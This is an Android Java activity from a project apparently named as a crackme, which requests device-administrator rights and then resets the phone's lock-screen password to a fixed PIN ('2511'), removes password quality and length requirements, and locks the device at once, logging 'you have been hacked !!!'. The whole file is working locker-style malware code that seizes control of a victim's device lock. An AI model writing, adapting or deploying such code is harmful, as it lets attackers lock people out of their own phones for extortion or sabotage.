package com.crackme_native.ofirmonis.passwordh;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.WindowManager;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {
    private ComponentName DeviceAdminComponent;
    private DevicePolicyManager devicePolicyManager;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON|
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD|
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED|
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        setContentView(R.layout.activity_main);
        this.DeviceAdminComponent = new ComponentName(getApplicationContext(), MyAdminReceiver.class);
        this.devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (this.devicePolicyManager.isAdminActive(this.DeviceAdminComponent)) {
            Log.d("is","you have been hacked !!!");
            changePassword();


        }
        else{
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,this.DeviceAdminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,"ofir");
            startActivityForResult(intent,1);
            changePassword();

        }

    }
    public void changePassword(){
        this.devicePolicyManager.setPasswordQuality(
                this.DeviceAdminComponent, DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
        this.devicePolicyManager.setPasswordMinimumLength(this.DeviceAdminComponent, 0);
        this.devicePolicyManager.resetPassword("2511",
                DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
        Log.d("is","password changed !");
        this.devicePolicyManager.lockNow();
        //this.finish();
    }
}
